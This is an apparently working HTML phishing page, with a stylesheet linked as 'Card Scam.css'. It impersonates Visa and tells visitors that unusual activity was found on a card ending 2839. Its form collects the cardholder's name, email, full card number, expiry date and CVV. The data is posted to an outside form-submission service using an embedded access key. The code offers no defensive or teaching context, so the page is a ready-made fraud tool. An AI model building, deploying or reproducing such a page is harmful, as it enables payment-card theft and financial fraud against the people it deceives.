<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <link rel="stylesheet" type="text/css" href="Card Scam.css">
    <style>
        /* Full-page background container */
        .background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png') no-repeat center center fixed; 
            background-size: cover;
            opacity: 0.25; /* 25% transparency */
            z-index: -1; /* Ensure background is behind everything else */
        }

        /* Centering container */
        .container {
            text-align: center;
            margin-top: 50px; /* Adjust as needed */
            font-family: 'Trebuchet MS', sans-serif; /* Changed font to Trebuchet MS */
            position: relative; /* Added position relative for container */
        }

        /* Form styling */
        form {
            display: inline-block;
            text-align: left; /* Resetting text alignment */
            font-family: 'Trebuchet MS', sans-serif; /* Changed font to Trebuchet MS */
        }

        /* Visa logo positioning and responsiveness */
        .visa-logo {
            position: absolute;
            top: 2%; /* Adjust as needed */
            left: 2%; /* Adjust as needed */
            width: 10vw; /* Adjust as needed */
            max-width: 100px; /* Ensure a maximum size */
            height: auto;
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            .container {
                margin-top: 20px; /* Adjust as needed for smaller screens */
            }
            .visa-logo {
                width: 15vw; /* Adjust size for smaller screens */
                max-width: 80px; /* Ensure a maximum size for smaller screens */
            }
        }
    </style>
</head>
<body>

<!-- Background container -->
<div class="background"></div>

<div class="container">
    <!-- Added Visa logo -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa Logo" class="visa-logo">

    <h1>Verification</h1>
    <h3>We Have Detected Some Unusual Activity On Your Visa Card Ending With 2839. Please Verify Your Authenticity.</h3>

    <form action="https://api.web3forms.com/submit" method="POST" id="verification-form">
        <!-- Replace with your Access Key -->
        <input type="hidden" name="access_key" value="f818be7e-6cf2-4005-966f-e601b2304d8a">

        <!-- Moved name input to the top -->
        <input type="text" name="name" placeholder="Name On Card" required>

        <!-- Form Inputs. Each input must have a name="" attribute -->
        <input type="email" name="email" placeholder="Email" required>
        
        <!-- Modified the number input -->
        <input type="text" name="Number" placeholder="Card Number" required maxlength="19" id="card-number-input">
        
        <!-- Modified the message input -->
        <input type="text" name="Message" placeholder="MM/YYYY" required maxlength="7" id="message-input">
        
        <input type="text" name="3digit" placeholder="CVV" required>

        <button type="submit">Submit Form</button>
    </form>
</div>

<script>
    // Add space after every four digits in the card number input
    document.getElementById('verification-form').addEventListener('input', function (e) {
        const cardNumberInput = document.querySelector('input[name="Number"]');
        const value = cardNumberInput.value.replace(/\s+/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
        cardNumberInput.value = value;
    });
    
    // Add slash after the first two characters in the message input
    document.getElementById('verification-form').addEventListener('input', function (e) {
        const messageInput = document.querySelector('input[name="Message"]');
        if (messageInput.value.length >= 2 && messageInput.value.indexOf('/') === -1) {
            messageInput.value = messageInput.value.substr(0, 2) + '/' + messageInput.value.substr(2);
        }
    });
</script>

</body>
</html>
